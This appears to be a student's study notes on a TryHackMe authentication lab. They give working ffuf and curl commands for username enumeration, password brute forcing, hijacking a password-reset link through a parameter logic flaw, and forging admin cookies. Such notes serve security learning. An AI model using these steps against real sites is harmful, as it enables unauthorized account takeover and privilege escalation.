### Table of contents
- [[#Username Enumeration]]
- [[#Brute Force]]
- [[#Logic Flaw]]
- [[#Cookie Tampering]]

___
### Username Enumeration
[[#Table of contents|Back to the top]]

When creating an account on a website, if account with username already exists we are notified 
$\rightarrow$ exploit this to create list of valid usernames

```Shell
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.218.54/customers/signup -mr "username already exists"
```
-d: data we are sending
-H: add additional headers to request; here setting Content type so server knows we're sending form data
-mr: text on page we're looking that indicates valid username

`nano valid_usernames.txt`, save the results

___
### Brute Force
[[#Table of contents|Back to the top]]

```Shell
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.218.54/customers/login -fc 200
```
Using multiple wordlists $\rightarrow$ can't use "FUZZ", have to specify other keyword $\rightarrow$ `W1`, `W2`
-fc 200: checks for HTTP code other than 200

*Test without -fc 200 $\rightarrow$ almost all results are 200, so exclude to show anomaly*

___
### Logic Flaw
[[#Table of contents|Back to the top]]

Exploiting bad coding

```Shell
curl 'http://10.10.218.54/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
```

When form is submitted key-value pairs are created: `email=robert@acmeitsupport.thm` and `username=robert`

We create an account in order to receive the ticket with the reset link

We can overwrite email for the reset link to be sent to us
```Shell
curl 'http://10.10.218.54/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=billy@customer.acmeitsupport.thm'
```

___
### Cookie Tampering

Do [this room](https://tryhackme.com/room/httpindetail) for better understanding of cookies

$\rightarrow$ unauthenticated access, access to other user account, elevated privileges

#### Plain Text
[[#Table of contents|Back to the top]]

Some cookies content is in plain text and very obvious:
```Java
Set-Cookie: logged_in=true; Max-Age=3600; Path=/
Set-Cookie: admin=false; Max-Age=3600; Path=/
```

Then we can try to modify the cookie's content at our advantage

```Shell
curl http://10.10.218.54/cookie-test
```
$\rightarrow$ "Not Logged In"

```Shell
curl -H "Cookie: logged_in=true; admin=false" http://10.10.218.54/cookie-test
```
$\rightarrow$ "Logged In As User"

```Shell
curl -H "Cookie: logged_in=true; admin=true" http://10.10.218.54/cookie-test
```
$\rightarrow$ "Logged In As An Admin"

#### Hashing
[[#Table of contents|Back to the top]]

Sometimes cookie values are hashed

**[CrackStation](https://crackstation.net/)**: databases of billions of hashes and their original strings

#### Encoding
[[#Table of contents|Back to the top]]

If cookie is encoded, **[decode](https://base64decode.org)** it, **change** value, **[recode](https://www.base64encode.org/)** it